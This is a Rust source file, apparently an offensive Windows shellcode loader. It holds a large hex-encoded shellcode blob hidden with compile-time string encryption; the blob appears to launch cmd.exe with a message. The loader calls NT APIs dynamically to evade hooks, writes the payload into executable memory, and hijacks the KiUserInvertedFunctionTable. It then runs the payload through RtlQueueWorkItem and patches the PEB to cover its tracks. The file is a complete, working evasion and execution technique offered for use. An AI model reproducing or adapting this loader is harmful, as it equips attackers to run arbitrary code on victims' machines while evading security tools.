#[macro_use]
extern crate litcrypt2;
use_litcrypt!();

use windows::Win32::{System::{Threading::{PROCESS_BASIC_INFORMATION, PEB}, WindowsProgramming::LDR_DATA_TABLE_ENTRY, Kernel::LIST_ENTRY}, Foundation::HANDLE};
use data::{MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE, PAGE_EXECUTE_READ, _INVERTED_FUNCTION_TABLE, PAGE_READONLY };
use std::{ffi::c_void, cell::UnsafeCell};
use std::mem::size_of;
use std::ptr::{self};

fn get_sh() -> String
{
    // Replace this with your shellcode
    let bytes = lc!("4055574881ECB8030000488D6C246065488B04256000000048894500488B4500488B401848894508488B4508C6404800488B4500488B40184883C02048898530010000488B8530010000488B004889853801000048B86B00650072006E004889453848B865006C00330032004889454048B82E0064006C006C004889454848C745500000000048C7855001000000000000488B8530010000488B0048898538010000488B85380100004883E81048898558010000C7856001000000000000488B8558010000488B406048898548010000488D453848898540010000C7856001000001000000488B85480100000FB70085C0750FC7856001000000000000E92E010000488B85480100000FB600888564010000488B85480100000FB7003DFF0000007E13488B85480100000FB70066898568010000EB460FBE856401000083F8417C1E0FBE856401000083F85A7F120FBE856401000083C020888565010000EB0D0FB68564010000888565010000660FBE856501000066898568010000488B85400100000FB600888564010000488B85400100000FB7003DFF0000007E13488B85400100000FB7006689856C010000EB460FBE856401000083F8417C1E0FBE856401000083F85A7F120FBE856401000083C020888565010000EB0D0FB68564010000888565010000660FBE85650100006689856C010000488B85480100004883C00248898548010000488B85400100004883C002488985400100000FB785680100000FB78D6C0100003BC10F84B5FEFFFF83BD60010000000F842E010000488B85480100004883E80248898548010000488B85400100004883E80248898540010000488B85480100000FB600888564010000488B85480100000FB7003DFF0000007E13488B85480100000FB70066898568010000EB460FBE856401000083F8417C1E0FBE856401000083F85A7F120FBE856401000083C020888565010000EB0D0FB68564010000888565010000660FBE856501000066898568010000488B85400100000FB600888564010000488B85400100000FB7003DFF0000007E13488B85400100000FB7006689856C010000EB460FBE856401000083F8417C1E0FBE856401000083F85A7F120FBE856401000083C020888565010000EB0D0FB68564010000888565010000660FBE85650100006689856C0100000FB785680100000FB78D6C0100002BC189856001000083BD60010000007510488B855801000048898550010000EB25488B8538010000488B0048898538010000488B8530010000483985380100000F85F9FCFFFF488B85500100004889857001000048B86E00740064006C004889453848B86C002E0064006C004889454048C745486C00000048C745500000000048C7857801000000000000488B8530010000488B0048898538010000488B85380100004883E81048898580010000C7858801000000000000488B8580010000488B406048898548010000488D453848898540010000C7858801000001000000488B85480100000FB70085C0750FC7858801000000000000E92E010000488B85480100000FB60088858C010000488B85480100000FB7003DFF0000007E13488B85480100000FB70066898590010000EB460FBE858C01000083F8417C1E0FBE858C01000083F85A7F120FBE858C01000083C02088858D010000EB0D0FB6858C01000088858D010000660FBE858D01000066898590010000488B85400100000FB60088858C010000488B85400100000FB7003DFF0000007E13488B85400100000FB70066898594010000EB460FBE858C01000083F8417C1E0FBE858C01000083F85A7F120FBE858C01000083C02088858D010000EB0D0FB6858C01000088858D010000660FBE858D01000066898594010000488B85480100004883C00248898548010000488B85400100004883C002488985400100000FB785900100000FB78D940100003BC10F84B5FEFFFF83BD88010000000F842E010000488B85480100004883E80248898548010000488B85400100004883E80248898540010000488B85480100000FB60088858C010000488B85480100000FB7003DFF0000007E13488B85480100000FB70066898590010000EB460FBE858C01000083F8417C1E0FBE858C01000083F85A7F120FBE858C01000083C02088858D010000EB0D0FB6858C01000088858D010000660FBE858D01000066898590010000488B85400100000FB60088858C010000488B85400100000FB7003DFF0000007E13488B85400100000FB70066898594010000EB460FBE858C01000083F8417C1E0FBE858C01000083F85A7F120FBE858C01000083C02088858D010000EB0D0FB6858C01000088858D010000660FBE858D010000668985940100000FB785900100000FB78D940100002BC189858801000083BD88010000007510488B858001000048898578010000EB25488B8538010000488B0048898538010000488B8530010000483985380100000F85F9FCFFFF488B8550010000488B403048898598010000488B85980100004863403C488B8D980100004803C8488BC1488985A0010000B808000000486BC000488B8DA00100008B840188000000488B8D980100004803C8488BC1488985A8010000488B85A80100008B4020488B8D980100004803C8488BC1488985B001000048B847657450726F634148894510C785B801000000000000486385B8010000488B8DB001000048630481488B8D98010000488B55104839140174108B85B8010000FFC08985B8010000EBCD488B85A80100008B4024488B8D980100004803C8488BC1488985C0010000488B85A80100008B401C488B8D980100004803C8488BC1488985C8010000486385B8010000488B8DC0010000480FBF0441488B8DC801000048630481488B8D980100004803C8488BC1488985D0010000488B8598010000488985D8010000488B8578010000488985E0010000488B85E0010000C78014010000FFFFFFFF488B8578010000488B4030488985E801000048B84C6F61644C6962724889451048C7451861727941488D5510488B8DD8010000FF95D0010000488985F001000048B852746C416C6C6F634889451048B8617465486561700048894518488D5510488B8DE8010000FF95D0010000488985F801000048B852746C43726561744889453848B86550726F636573734889454048B8506172616D6574654889454848C7455072734578488D5538488B8DE8010000FF95D00100004889850002000048B84E744372656174654889452048B85573657250726F634889452848C7453065737300488D5520488B8DE8010000FF95D00100004889850802000048B852746C496E6974554889452048B86E69636F646553744889452848C7453072696E67488D5520488B8DE8010000FF95D00100004889851002000048B85C003F003F005C004889456048B843003A005C0057004889456848B869006E0064006F004889457048B8770073005C0053004889457848B879007300740065004889858000000048B86D00330032005C004889858800000048B863006D0064002E004889859000000048B8650078006500000048898598000000488D5560488D8D18020000FF951002000048B85C003F003F005C00488985A000000048B843003A005C005700488985A800000048B869006E0064006F00488985B000000048B8770073005C005300488985B800000048B87900730074006500488985C000000048B86D00330032005C00488985C800000048B863006D0064002E00488985D000000048B86500780065002000488985D800000048B82F006B0020006D00488985E000000048B87300670020002A00488985E800000048B82000480065006C00488985F000000048B86C006F0020006600488985F800000048B872006F006D0020004889850001000048B86B007500640061004889850801000048C785100100006500730048C785180100000000000048C7852001000000000000488D95A0000000488D8D28020000FF951002000048C7853802000000000000C74424500100000048C74424480000000048C74424400000000048C74424380000000048C74424300000000048C744242800000000488D852802000048894424204533C94533C0488D9518020000488D8D38020000FF9500020000488D8540020000488BF833C0B958000000F3AA48C7854002000058000000C7854802000000000000B808000000486BC00141B820000000BA08000000488B4D00488B4C0128FF95F8010000488985A0020000488B85A002000048C70028000000B820000000486BC000488B8DA0020000C744010805000200B820000000486BC0000FB78D18020000488B95A002000048894C0210B820000000486BC000488B8DA0020000488B9520020000488954011848C785B002000000000000488B85A00200004889442450488D85400200004889442448488B85380200004889442440C744243800000000C74424300000000048C74424280000000048C74424200000000041B9FFFF1F0041B8FFFF1F00488D95B0020000488D8DA8020000FF95080200008985B802000048B84E7453757370656E4889451048B8645468726561640048894518488D5510488B8DE8010000FF95D0010000488985C002000033D248C7C1FEFFFFFFFF95C0020000488DA5580300005F5DC3");

    bytes
}

#[no_mangle]
fn run() -> bool
{
    #![allow(invalid_reference_casting)]
    unsafe
    {        
        restore_peb();

        // Write our real payload on the current process' memory space
        let addr = 0 as isize;
        let phand = HANDLE {0: -1};
        let addr: *mut c_void = std::mem::transmute(addr);
        let base_address_shellcode: *mut *mut c_void = std::mem::transmute(&addr);
        let zero_bits = 0 as usize;
        let sh = get_sh();
        let decoded_sh =  hex::decode(sh).expect("");
        let sh_size: UnsafeCell<usize> = decoded_sh.len().into(); // Not needed because invalid_reference_casting is enabled
        let size: *mut usize = sh_size.get();

        let ret = dinvoke::nt_allocate_virtual_memory(
            phand, 
            base_address_shellcode, 
            zero_bits, 
            size, 
            MEM_COMMIT | MEM_RESERVE, 
            PAGE_READWRITE);
        
        if ret != 0
        {
            return true;
        }

        let base_address: *mut c_void = *base_address_shellcode;
        let written: usize = 0;
        let buffer: *mut c_void = std::mem::transmute(decoded_sh.as_ptr());
        let nsize: UnsafeCell<usize> =  decoded_sh.len().into();
        let nsize = *(nsize.get());
        let bytes_written: *mut usize = std::mem::transmute(&written);
        let ret = dinvoke::nt_write_virtual_memory(
            phand, 
            base_address, 
            buffer, 
            nsize, 
            bytes_written);

        if ret != 0 && *bytes_written < nsize
        {
            return true;
        }

        let size: *mut usize = sh_size.get();
        let o = u32::default();
        let old_protection: *mut u32 = std::mem::transmute(&o);
        let ret = dinvoke::nt_protect_virtual_memory(
            phand, 
            base_address_shellcode, 
            size, 
            PAGE_EXECUTE_READ, 
            old_protection);

        if ret != 0
        {
            return true;
        } 

        let phand = HANDLE {0: -1};
        let ntdll = dinvoke::get_module_base_address(&lc!("ntdll.dll"));
        let ki_user_inverted_function_table = dinvoke::get_function_address(ntdll, &lc!("KiUserInvertedFunctionTable"));
        let s = isize::default();
        let size: *mut usize = std::mem::transmute(&s);
        *size = size_of::<_INVERTED_FUNCTION_TABLE>();
        let bas: *mut c_void = std::mem::transmute(ki_user_inverted_function_table);
        let bas: *mut *mut c_void = std::mem::transmute(&bas);
        let u = u32::default();
        let old_protection: *mut u32 = std::mem::transmute(&u);
        let ret = dinvoke::nt_protect_virtual_memory(
            phand, 
            bas, 
            size, 
            PAGE_READWRITE, 
            old_protection);

        if ret != 0
        {
            return true;
        } 

        // Replace the first value on the inverted function table to point to our injected shellcode
        let inverted_table: *mut data::_INVERTED_FUNCTION_TABLE = ki_user_inverted_function_table as *mut _;
        let old_value = (*inverted_table).table_entry[0].image_base;
        (*inverted_table).table_entry[0].image_base = *base_address_shellcode as isize;

        let ki_user_inverted_function_table = dinvoke::get_function_address(ntdll, &lc!("KiUserInvertedFunctionTable"));
        let s = isize::default();
        let size: *mut usize = std::mem::transmute(&s);
        *size = size_of::<_INVERTED_FUNCTION_TABLE>();
        let ba: *mut c_void = std::mem::transmute(ki_user_inverted_function_table);
        let base_address: *mut *mut c_void = std::mem::transmute(&ba);
        let u = u32::default();
        let old_protection: *mut u32 = std::mem::transmute(&u);
        let ret = dinvoke::nt_protect_virtual_memory(
            phand, 
            base_address, 
            size, 
            PAGE_READONLY, 
            old_protection);

        if ret != 0
        {
            return true;
        } 

        quit_shutdown();

        let f: data::RtlQueueWorkItem;
        let _r: Option<i32>;
        let dir: *mut c_void = *base_address_shellcode; 
        let context: *mut c_void = std::mem::transmute(0isize);
        // Run the injected shellcode on the default thread pool
        dinvoke::dynamic_invoke!(ntdll,&lc!("RtlQueueWorkItem"),f,_r,dir,context,0x00000000 as u32);

        let ki_user_inverted_function_table = dinvoke::get_function_address(ntdll, &lc!("KiUserInvertedFunctionTable"));
        let s = isize::default();
        let size: *mut usize = std::mem::transmute(&s);
        *size = size_of::<_INVERTED_FUNCTION_TABLE>();
        let ba: *mut c_void = std::mem::transmute(ki_user_inverted_function_table);
        let base_address: *mut *mut c_void = std::mem::transmute(&ba);
        let u = u32::default();
        let old_protection: *mut u32 = std::mem::transmute(&u);
        let ret = dinvoke::nt_protect_virtual_memory(
            phand, 
            base_address, 
            size, 
            PAGE_READWRITE, 
            old_protection);

        if ret != 0
        {
            return true;
        } 

        // Restore the previously modified value of the inverted function table.
        let inverted_table: *mut data::_INVERTED_FUNCTION_TABLE = ki_user_inverted_function_table as *mut _;
        (*inverted_table).table_entry[0].image_base = old_value;

         
        let ki_user_inverted_function_table = dinvoke::get_function_address(ntdll, &lc!("KiUserInvertedFunctionTable"));
        let s = isize::default();
        let size: *mut usize = std::mem::transmute(&s);
        *size = size_of::<_INVERTED_FUNCTION_TABLE>();
        let ba: *mut c_void = std::mem::transmute(ki_user_inverted_function_table);
        let base_address: *mut *mut c_void = std::mem::transmute(&ba);
        let u = u32::default();
        let old_protection: *mut u32 = std::mem::transmute(&u);
        let _ret = dinvoke::nt_protect_virtual_memory(
            phand, 
            base_address, 
            size, 
            PAGE_READONLY, 
            old_protection);

        dinvoke::close_handle(phand);

        true

    }
}

/*
    Since we want our payload to be executed only once, we need to restore the PEB to its previous state.
    To do so, we iterate again over the PEB's loaded modules list until we find the entry corresponding to
    kernelbase.dll and we restore the entry point address.
 */
fn restore_peb()
{
    unsafe
    {
        let kernelbase = dinvoke::get_module_base_address(&lc!("kernelbase.dll")) as isize;
        let phand: HANDLE = HANDLE {0: -1};

        let pi = PROCESS_BASIC_INFORMATION::default();
        let process_information: *mut c_void = std::mem::transmute(&pi);
        let ret = dinvoke::nt_query_information_process(
            phand, 
            0, 
            process_information,  
            size_of::<PROCESS_BASIC_INFORMATION>() as u32, 
            ptr::null_mut());
        
        if ret != 0
        {
            return;
        }

        let peb: PEB = std::mem::zeroed();
        let peb_ptr: *mut PEB = std::mem::transmute(&peb);
        let process_information_ptr: *mut PROCESS_BASIC_INFORMATION = std::mem::transmute(process_information);
        let written = usize::default();
        let bytes_written: *mut usize = std::mem::transmute(&written);
        let ret = dinvoke::nt_read_virtual_memory(
            phand, 
            (*process_information_ptr).PebBaseAddress as *mut _, 
            peb_ptr as *mut _, 
            size_of::<PEB>(), 
            bytes_written
        );

        if ret != 0
        {
            return;
        } 

        let peb_ldr_data: data::PEB_LDR_DATA = std::mem::zeroed();
        let peb_ldr_data_ptr: *mut data::PEB_LDR_DATA = std::mem::transmute(&peb_ldr_data);
        let written = usize::default();
        let bytes_written: *mut usize = std::mem::transmute(&written);
        let ret = dinvoke::nt_read_virtual_memory(
            phand, 
            (*peb_ptr).Ldr as *mut _, 
            peb_ldr_data_ptr as *mut _, 
            size_of::<data::PEB_LDR_DATA>(), 
            bytes_written
        );

        if ret != 0
        {
            return;
        }

        let list_head = (*peb_ldr_data_ptr).in_load_order_module_list.Flink;
        let mut current_node = (*peb_ldr_data_ptr).in_load_order_module_list.Flink;
        loop 
        {
            let mut entry: LDR_DATA_TABLE_ENTRY  = std::mem::zeroed();
            let entry_ptr: *mut LDR_DATA_TABLE_ENTRY  = std::mem::transmute(&entry);
            let base_address = current_node as *mut c_void;
            let written = usize::default();
            let bytes_written: *mut usize = std::mem::transmute(&written);
            let ret = dinvoke::nt_read_virtual_memory(
                phand, 
                base_address, 
                entry_ptr as *mut _, 
                size_of::<LDR_DATA_TABLE_ENTRY>(), 
                bytes_written
            ); 

            if ret != 0
            {
                return;
            }

            if entry.DllBase as isize == kernelbase
            {

                let offset = (kernelbase as isize + 0x3C) as *mut u32; 
                let rva = *offset as isize;
                // Kernelbase.dll's entry point offset calculation
                let entry_point_offset = (kernelbase + rva + 0x18 + 16 as isize) as *const u32;
                entry.Reserved3[0] = (kernelbase + *entry_point_offset as isize) as *mut _; 
                let written = usize::default();
                let bytes_written: *mut usize = std::mem::transmute(&written);

                let _ret = dinvoke::nt_write_virtual_memory(
                    phand, 
                    base_address, 
                    entry_ptr as *mut _, 
                    size_of::<LDR_DATA_TABLE_ENTRY>(), 
                    bytes_written
                ); 

                return;
               
            }
            current_node = (*entry_ptr).Reserved1[0] as *mut LIST_ENTRY;

            if current_node == list_head
            {
                break;
            }

        } 

        dinvoke::close_handle(phand); 

    }
}

/*
    Just in case this loader is triggered when the process is being terminated, we need to 
    set the PEB's ShutdownInProgress value to false before calling RtlQueueWorkItem.
 */
fn quit_shutdown()
{
    unsafe
    {
        let phand = HANDLE {0: -1};
        let pi = PROCESS_BASIC_INFORMATION::default();
        let process_information: *mut c_void = std::mem::transmute(&pi);
        let ret = dinvoke::nt_query_information_process(
            phand, 
            0, 
            process_information,  
            size_of::<PROCESS_BASIC_INFORMATION>() as u32, 
            ptr::null_mut());
        
        if ret != 0
        {
            return;
        }

        let peb: PEB = std::mem::zeroed();
        let peb_ptr: *mut PEB = std::mem::transmute(&peb);
        let process_information_ptr: *mut PROCESS_BASIC_INFORMATION = std::mem::transmute(process_information);
        let written = usize::default();
        let bytes_written: *mut usize = std::mem::transmute(&written);
        let ret = dinvoke::nt_read_virtual_memory(
            phand, 
            (*process_information_ptr).PebBaseAddress as *mut _, 
            peb_ptr as *mut _, 
            size_of::<PEB>(), 
            bytes_written
        );

        if ret != 0
        {
            return;
        } 

        let mut peb_ldr_data: data::PEB_LDR_DATA = std::mem::zeroed();
        let peb_ldr_data_ptr: *mut data::PEB_LDR_DATA = std::mem::transmute(&peb_ldr_data);
        let written = usize::default();
        let bytes_written: *mut usize = std::mem::transmute(&written);
        let ret = dinvoke::nt_read_virtual_memory(
            phand, 
            (*peb_ptr).Ldr as *mut _, 
            peb_ldr_data_ptr as *mut _, 
            size_of::<data::PEB_LDR_DATA>(), 
            bytes_written
        );

        if ret != 0
        {
            return;
        }

        peb_ldr_data.shutdown_in_progress = false;

        let written = usize::default();
        let bytes_written: *mut usize = std::mem::transmute(&written);
        let _ret = dinvoke::nt_write_virtual_memory(
            phand, 
            (*peb_ptr).Ldr as *mut _, 
            peb_ldr_data_ptr as *mut _, 
            size_of::<data::PEB_LDR_DATA>(), 
            bytes_written
        );

    }
}